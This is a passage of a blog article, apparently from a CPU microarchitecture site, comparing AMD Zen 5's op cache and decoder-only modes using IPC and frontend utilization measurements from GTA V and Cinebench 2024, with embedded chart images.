loading="lazy"></picture></div></a></figure></div><p>Like Cyberpunk 2077, GTA V averages just under 1 IPC. That won’t stress frontend throughput. On average, the frontend delivered ops in op cache mode over 16.4% of active cycles, and did so in decoder mode over 7.9% of active cycles.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34a44643-9bec-4920-976a-729f6b954c9f_1439x729.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34a44643-9bec-4920-976a-729f6b954c9f_1439x729.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34a44643-9bec-4920-976a-729f6b954c9f_1439x729.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34a44643-9bec-4920-976a-729f6b954c9f_1439x729.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34a44643-9bec-4920-976a-729f6b954c9f_1439x729.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34a44643-9bec-4920-976a-729f6b954c9f_1439x729.png" width="1439" height="729" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/34a44643-9bec-4920-976a-729f6b954c9f_1439x729.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:729,&quot;width&quot;:1439,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:181273,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34a44643-9bec-4920-976a-729f6b954c9f_1439x729.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34a44643-9bec-4920-976a-729f6b954c9f_1439x729.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34a44643-9bec-4920-976a-729f6b954c9f_1439x729.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F34a44643-9bec-4920-976a-729f6b954c9f_1439x729.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>With everything forced onto the decoders, the frontend delivers ops over 29.5% of active cycles. Again, the frontend is busier, but those decoders still spend most of their time on break.</p><p>Cinebench 2024 is a popular benchmark among enthusiasts. It’s simple to run, leading to a lot of comparison data floating around the internet. That by itself makes the benchmark worth paying attention to. I’m again running with Core Performance Boost disabled to provide consistent clock speeds, because I’m running on Windows and not setting core affinity like I did with SPEC CPU2017 runs.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb8aeb78b-69e4-4264-8dd5-66c1ca3d4e54_837x491.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb8aeb78b-69e4-4264-8dd5-66c1ca3d4e54_837x491.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb8aeb78b-69e4-4264-8dd5-66c1ca3d4e54_837x491.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb8aeb78b-69e4-4264-8dd5-66c1ca3d4e54_837x491.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb8aeb78b-69e4-4264-8dd5-66c1ca3d4e54_837x491.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb8aeb78b-69e4-4264-8dd5-66c1ca3d4e54_837x491.png" width="837" height="491" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/b8aeb78b-69e4-4264-8dd5-66c1ca3d4e54_837x491.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:491,&quot;width&quot;:837,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:60345,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb8aeb78b-69e4-4264-8dd5-66c1ca3d4e54_837x491.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb8aeb78b-69e4-4264-8dd5-66c1ca3d4e54_837x491.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb8aeb78b-69e4-4264-8dd5-66c1ca3d4e54_837x491.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb8aeb78b-69e4-4264-8dd5-66c1ca3d4e54_837x491.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Single threaded mode has the op cache giving Zen 5 a 13.5% performance advantage over decoder-only mode. That’s in line with many of SPEC CPU2017’s workloads. Cinebench 2024 averages 2.45 IPC, making it a much higher IPC workload than the two games tested above. Op cache hitrate is closer to Cyberpunk 2077, at 84.4%. Again, that’s lower than in most SPEC CPU2017 workloads.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29f0b510-e15e-4b96-917d-d107f1ce7f20_1382x738.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29f0b510-e15e-4b96-917d-d107f1ce7f20_1382x738.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29f0b510-e15e-4b96-917d-d107f1ce7f20_1382x738.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29f0b510-e15e-4b96-917d-d107f1ce7f20_1382x738.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29f0b510-e15e-4b96-917d-d107f1ce7f20_1382x738.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29f0b510-e15e-4b96-917d-d107f1ce7f20_1382x738.png" width="1382" height="738" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/29f0b510-e15e-4b96-917d-d107f1ce7f20_1382x738.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:738,&quot;width&quot;:1382,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:290330,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29f0b510-e15e-4b96-917d-d107f1ce7f20_1382x738.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29f0b510-e15e-4b96-917d-d107f1ce7f20_1382x738.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29f0b510-e15e-4b96-917d-d107f1ce7f20_1382x738.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29f0b510-e15e-4b96-917d-d107f1ce7f20_1382x738.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Higher IPC demands more frontend throughput. Zen 5’s frontend was feeding the core from the op cache over 35.4% of cycles, and did so from the decoder over 11.5% of cycles. Frontend utilization is thus higher than in the two games tested above. Still, the frontend is spending most of its time on break, or waiting for data.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2b40390f-6d8c-417f-8807-d32bc08ebd8a_1376x743.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2b40390f-6d8c-417f-8807-d32bc08ebd8a_1376x743.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2b40390f-6d8c-417f-8807-d32bc08ebd8a_1376x743.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2b40390f-6d8c-417f-8807-d32bc08ebd8a_1376x743.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2b40390f-6d8c-417f-8807-d32bc08ebd8a_1376x743.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2b40390f-6d8c-417f-8807-d32bc08ebd8a_1376x743.png" width="1376" height="743" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/2b40390f-6d8c-417f-8807-d32bc08ebd8a_1376x743.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:743,&quot;width&quot;:1376,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:354457,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2b40390f-6d8c-417f-8807-d32bc08ebd8a_1376x743.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2b40390f-6d8c-417f-8807-d32bc08ebd8a_1376x743.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2b40390f-6d8c-417f-8807-d32bc08ebd8a_1376x743.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2b40390f-6d8c-417f-8807-d32bc08ebd8a_1376x743.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Turn off the op cache, and IPC drops to 2.15. The decoders see surprisingly heavy utilization. On average they’re busy over 69% of core active cycles. I don’t know what’s going on here, but the same pattern showed up over some of SPEC CPU2017’s floating point workloads. Cinebench 2024 does use a lot of floating point operations, because 42.8% of ops from the frontend were dispatched to Zen 5’s floating point side.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7b33314-01f2-4be8-b6d1-38c2ac2bf90e_1621x818.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7b33314-01f2-4be8-b6d1-38c2ac2bf90e_1621x818.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7b33314-01f2-4be8-b6d1-38c2ac2bf90e_1621x818.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7b33314-01f2-4be8-b6d1-38c2ac2bf90e_1621x818.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7b33314-01f2-4be8-b6d1-38c2ac2bf90e_1621x818.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7b33314-01f2-4be8-b6d1-38c2ac2bf90e_1621x818.png" width="1456" height="735" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f7b33314-01f2-4be8-b6d1-38c2ac2bf90e_1621x818.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:735,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:358516,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7b33314-01f2-4be8-b6d1-38c2ac2bf90e_1621x818.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7b33314-01f2-4be8-b6d1-38c2ac2bf90e_1621x818.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7b33314-01f2-4be8-b6d1-38c2ac2bf90e_1621x818.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7b33314-01f2-4be8-b6d1-38c2ac2bf90e_1621x818.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>I ran Cinebench and game tests on Windows, where I use my own performance monitoring program to log results. I wrote </span><a href="https://github.com/clamchowder/pmcreader" rel="">the program</a><span> to give myself stats updated every second, because I wanted a convenient way to see performance limiters in everyday tasks. I later added logging capability, which logs on the same 1-second intervals. That gives me per-second data, unlike </span><code>perf</code><span> on Linux where I collect stats over the entire run. I can also shake things up and plot those 1-second intervals with IPC on one axis, and frontend busy-ness on the other.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d299305-e09b-4e7d-b22f-e279f9961cfb_1552x851.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d299305-e09b-4e7d-b22f-e279f9961cfb_1552x851.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d299305-e09b-4e7d-b22f-e279f9961cfb_1552x851.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d299305-e09b-4e7d-b22f-e279f9961cfb_1552x851.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d299305-e09b-4e7d-b22f-e279f9961cfb_1552x851.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d299305-e09b-4e7d-b22f-e279f9961cfb_1552x851.png" width="1456" height="798" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/5d299305-e09b-4e7d-b22f-e279f9961cfb_1552x851.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:798,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:224514,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d299305-e09b-4e7d-b22f-e279f9961cfb_1552x851.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d299305-e09b-4e7d-b22f-e279f9961cfb_1552x851.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d299305-e09b-4e7d-b22f-e279f9961cfb_1552x851.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5d299305-e09b-4e7d-b22f-e279f9961cfb_1552x851.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Cinebench 2024 exhibits plenty of IPC variation as the benchmark renders different tiles. IPC can go as high as 3.63 over a one second interval (with the op cache on), which can push the capabilities of a single 4-wide decoder. Indeed, a single 4-wide decoder cluster starts to run out of headroom during higher IPC portions of Cinebench 2024’s single threaded test.</p><p>As an aside, ideally I’d have even faster sampling rates. But writing a more sophisticated performance monitoring program isn’t practical for a free time project. And I still think the graph above is a cool illustration of how the 4-wide decoder starts running out of steam during higher IPC sections of the benchmark, while the op cache has plenty of throughput left on tap.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37556ed2-ef2e-40a4-90d1-ee7809abe121_828x492.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37556ed2-ef2e-40a4-90d1-ee7809abe121_828x492.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37556ed2-ef2e-40a4-90d1-ee7809abe121_828x492.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37556ed2-ef2e-40a4-90d1-ee7809abe121_828x492.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37556ed2-ef2e-40a4-90d1-ee7809abe121_828x492.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37556ed2-ef2e-40a4-90d1-ee7809abe121_828x492.png" width="828" height="492" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/37556ed2-ef2e-40a4-90d1-ee7809abe121_828x492.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:492,&quot;width&quot;:828,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:64145,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37556ed2-ef2e-40a4-90d1-ee7809abe121_828x492.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37556ed2-ef2e-40a4-90d1-ee7809abe121_828x492.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37556ed2-ef2e-40a4-90d1-ee7809abe121_828x492.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F37556ed2-ef2e-40a4-90d1-ee7809abe121_828x492.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Of course no one runs a rendering program in single threaded mode. I haven’t used Maxon’s Cinema 4D before, but Blender will grab all the CPU cores it can get its hands on right out of the box. In Cinebench 2024’s multi-threaded mode, I see just a 2.2% score difference with op cache enabled or disabled. Again, the two decode clusters show their worth in a multithreaded workload.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F40c0c612-0348-47dd-9cd1-5696dc4c0b85_1812x881.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F40c0c612-0348-47dd-9cd1-5696dc4c0b85_1812x881.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F40c0c612-0348-47dd-9cd1-5696dc4c0b85_1812x881.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F40c0c612-0348-47dd-9cd1-5696dc4c0b85_1812x881.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F40c0c612-0348-47dd-9cd1-5696dc4c0b85_1812x881.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F40c0c612-0348-47dd-9cd1-5696dc4c0b85_1812x881.png" width="1456" height="708" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/40c0c612-0348-47dd-9cd1-5696dc4c0b85_1812x881.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:708,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:223029,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F40c0c612-0348-47dd-9cd1-5696dc4c0b85_1812x881.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F40c0c612-0348-47dd-9cd1-5696dc4c0b85_1812x881.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F40c0c612-0348-47dd-9cd1-5696dc4c0b85_1812x881.png 